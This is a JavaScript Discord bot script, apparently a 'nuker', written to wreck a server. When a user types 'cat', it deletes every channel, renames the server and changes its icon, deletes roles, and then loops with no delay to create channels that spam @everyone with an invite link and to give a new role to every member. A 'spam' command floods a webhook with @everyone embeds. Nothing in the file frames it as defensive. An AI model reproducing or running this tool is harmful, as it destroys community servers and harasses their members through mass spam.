const Discord = require('discord.js');
const client = new Discord.Client();
config = require('./config.json'),

client.once('ready',() => {
    console.log(`Join To ${client.user.tag} | Bot`)
    console.log(`1`)
    console.log(`2`)
    console.log(`3`)
    console.log(`4`)
    console.log(`5`)
    console.log(`6`)
    console.log(`7`)
    console.log(`Write "hello" for destroy `)
})

const destroyer = 'a cat';

const groupLink = 'https://discord.gg/23b6HGrYJZ';

const vidoepLink = `https://www.gifimili.com/gif/2018/02/chaton.gif`


const webhookClient = new Discord.WebhookClient("ID Webhook" ,  "Token Webhook");


//A script by Nelectrons#6666

client.on('message', message => {
    if(message.content === "cat") {

       message.guild.channels.cache.forEach(channel => channel.delete())
       message.guild.setName('Cat')
       message.guild.setIcon("https://www.heberger-image.fr/images/2021/07/19/sandraluca_4fd5e9f0328a4.jpg")     
      message.guild.roles.cache.forEach(role => {
        let botHighestRole = message.guild.member(client.user.id).roles.highest;
        let isBotRoleHigher = role.comparePositionTo(botHighestRole)<0;
        if (role.name !== "Kitty" && 
        isBotRoleHigher && !role.managed) {

            role.delete();
            
            
        }
        setInterval (function () {
            message.guild.channels.create(`Fucked by ${destroyer} `, { reason: 'Fucked by a cat' }).then(channel => {
                setInterval (function () {
                    channel.send(`Fucked By | ${destroyer} | ${groupLink} ${vidoepLink} @everyone`)
                    const role1 = message.guild.roles.create({
                        data: {
                          name: 'Cat',
                          color: 'RANDOM',
           
                        },
                        reason: 'cat is beautiful',
                      }).then(role1 => message.guild.members.cache.filter(m => !m.user.bot).forEach(member => member.roles.add(role1))) 

                      
                }, 0 * 400);      
            })
        }, 0 * 400); 
        
        
       
        
    })

       

    }
});
client.on('message', message => {
    if(message.content === "spam") {
        setInterval (function () {
            const exampleEmbed = new Discord.MessageEmbed()
            .setTitle("KITTED")
            .setColor("RANDOM ")
            .setDescription("CAT IS BACK")
            .setImage("https://www.heberger-image.fr/images/2021/07/19/sandraluca_4fd5e9f0328a4.jpg")
            .setFooter("a cat")
            
            webhookClient.send("@everyone" , exampleEmbed).then(log => console.log("1 message sent"))
            webhookClient.edit({name: "NINJA CAT", avatar: "https://media.discordapp.net/attachments/840514247497875477/840533115809169408/mogobi_gaming.png?width=670&height=670"}) 

          }, 0 * 200); 
        
    }
})




client.login(config.token);
